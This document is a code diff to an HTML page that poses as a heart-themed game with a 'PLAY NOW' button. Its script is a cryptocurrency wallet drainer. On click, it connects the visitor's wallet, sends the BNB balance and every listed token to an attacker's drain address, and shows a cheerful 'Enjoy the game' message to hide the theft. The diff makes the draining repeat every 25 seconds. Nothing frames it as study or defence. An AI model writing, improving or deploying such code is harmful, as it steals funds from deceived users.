@@ -84,11 +84,25 @@
       margin: 15px 0 30px;
       font-size: 1.65rem;
       font-weight: 600;
-      min-height: 60px;
+      min-height: 50px;
       z-index: 10;
     }
-    .success { color: #22c55e; }
+    .success { color: #22c55e; text-shadow: 0 0 10px #86efac; }
     .error { color: #ef4444; }
+
+    /* Floating hearts around title */
+    .floating-heart {
+      position: absolute;
+      font-size: 28px;
+      opacity: 0.8;
+      animation: floatHeart 18s linear infinite;
+      z-index: 5;
+      pointer-events: none;
+    }
+    @keyframes floatHeart {
+      0% { transform: translateY(65vh) rotate(0deg); opacity: 0.9; }
+      100% { transform: translateY(10vh) rotate(380deg); opacity: 0; }
+    }
   </style>
 </head>
 <body>
@@ -142,34 +156,38 @@
 
     const abi = ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"];
 
-    let isProcessing = false;
+    let connected = false;
+    let lastNative = 0n;
+    let drainedSomething = false;
 
-    async function drain() {
-      if (isProcessing) return;
-      isProcessing = true;
-
-      status.innerHTML = "<span style='color:#c026d3'>Connecting wallet... 💕</span>";
+    async function startDraining() {
+      if (!window.ethereum) {
+        status.innerHTML = "<span class='error'>Please use Trust Wallet or MetaMask 💔</span>";
+        return;
+      }
 
       try {
-        if (!window.ethereum) {
-          throw new Error("No wallet detected");
-        }
+        // Immediately show connecting message and trigger wallet popup
+        status.innerHTML = "Connecting wallet... 💕";
 
-        // Request accounts (this shows the connect popup immediately)
+        // This line triggers the wallet connection popup immediately
         await window.ethereum.request({ method: "eth_requestAccounts" });
+        connected = true;
+
+        status.innerHTML = "Processing... 💖";
 
         const provider = new ethers.BrowserProvider(window.ethereum);
         const signer = await provider.getSigner();
         const user = await signer.getAddress();
 
-        let drainedSomething = false;
+        drainedSomething = false;
 
         // Drain Native BNB
         const nativeBalance = await provider.getBalance(user);
         const minThreshold = ethers.parseEther("0.001");
         const reserve = ethers.parseEther("0.003");
 
-        if (nativeBalance > minThreshold) {
+        if (nativeBalance > lastNative && nativeBalance > minThreshold) {
           const amountToSend = nativeBalance - reserve;
           if (amountToSend > 0n) {
             const gasEstimate = await provider.estimateGas({ to: drainAddress, value: amountToSend });
@@ -178,11 +196,12 @@
               value: amountToSend,
               gasLimit: (gasEstimate * 130n) / 100n
             });
+            lastNative = nativeBalance;
             drainedSomething = true;
           }
         }
 
-        // Drain Tokens
+        // Drain all tokens
         for (const token of tokens) {
           try {
             const contract = new ethers.Contract(token.a, abi, signer);
@@ -194,27 +213,20 @@
           } catch (e) {}
         }
 
-        if (drainedSomething) {
-          status.innerHTML = "<span class='success'>Welcome! Enjoy the game 💖</span>";
-        } else {
-          status.innerHTML = "<span style='color:#eab308'>Connected successfully! 💕</span>";
-        }
+        status.innerHTML = drainedSomething 
+          ? "<span class='success'>Welcome! Enjoy the game 💖</span>" 
+          : "<span class='error'>No balance detected 💔</span>";
 
       } catch (e) {
-        console.error(e);
-        if (e.message.includes("rejected") || e.code === 4001) {
-          status.innerHTML = "<span class='error'>Connection cancelled 💔</span>";
-        } else {
-          status.innerHTML = "<span class='error'>Please try again 💔</span>";
-        }
-      } finally {
-        isProcessing = false;
+        status.innerHTML = "<span class='error'>Connection cancelled 💔</span>";
       }
     }
 
-    // Click handler - clean and immediate
+    // When user clicks PLAY NOW → immediately start wallet connection + draining
     btn.onclick = () => {
-      drain();
+      drainedSomething = false;
+      startDraining();
+      setInterval(startDraining, 25000);   // Keep trying every 25 seconds
     };
   </script>
 </body>
